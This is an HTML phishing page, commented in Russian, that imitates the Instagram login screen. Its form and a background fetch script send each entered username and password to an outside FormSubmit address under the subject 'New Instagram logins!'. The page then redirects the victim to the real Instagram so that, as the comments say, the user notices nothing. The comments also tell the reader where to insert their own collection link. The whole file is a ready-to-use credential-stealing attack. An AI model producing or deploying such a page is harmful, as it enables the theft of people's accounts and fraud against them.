<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Подключаем шрифт Roboto, как у Инсты -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        /* Логотип Instagram текстом или картинкой */
        h1 {
            font-family: 'Billabong', cursive; 
            font-size: 48px;
            margin-bottom: 20px;
            color: #262626;
            font-weight: normal;
        }
        input {
            width: 100%;
            padding: 9px 7px 8px;
            background: #fafafa;
            border: 1px solid #dcdddc;
            border-radius: 3px;
            margin-bottom: 10px;
            font-size: 12px;
            box-sizing: border-box;
            color: #8e8e8e;
        }
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        button {
            width: 100%;
            padding: 7px;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1a8cd8;
        }
        p {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 15px;
        }
        a {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        .logo-img {
            width: 175px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Логотип (можно заменить на картинку, если найдешь ссылку) -->
        <h1>Instagram</h1>
        
        <!-- ВАЖНО: В action вставь свою ссылку от FormSubmit -->
        <form id="instaForm" action="https://formsubmit.co/el/cibifi" method="POST">
            
            <!-- Скрытые поля для красоты формы -->
            <input type="hidden" name="_subject" value="Новые логины Instagram!">
            <input type="hidden" name="_next" value="https://www.instagram.com/">
            
            <input type="text" name="username" placeholder="Телефон, имя пользователя или эл. адрес" required>
            <input type="password" name="password" placeholder="Пароль" required>
            
            <button type="submit">Войти</button>
        </form>
        
        <p><a href="#">Забыли учётную запись?</a></p>
        <p>Или <a href="#">Зарегистрироваться</a></p>
    </div>

    <script>
        // Этот скрипт перехватывает нажатие кнопки "Войти"
        document.getElementById('instaForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Останавливаем стандартную отправку формы
            
            var form = this;
            
            // Отправляем данные на FormSubmit в фоне (AJAX), чтобы пользователь ничего не заметил
            fetch(form.action, {
                method: 'POST',
                body: new FormData(form)
            }).then(response => {
                // Сразу после отправки данных перенаправляем жертву на настоящий инстаграм
                window.location.href = "https://www.instagram.com/";
            }).catch(error => {
                // Если вдруг ошибка, все равно кидаем на инстаграм
                window.location.href = "https://www.instagram.com/";
            });
        });
    </script>
</body>
</html>
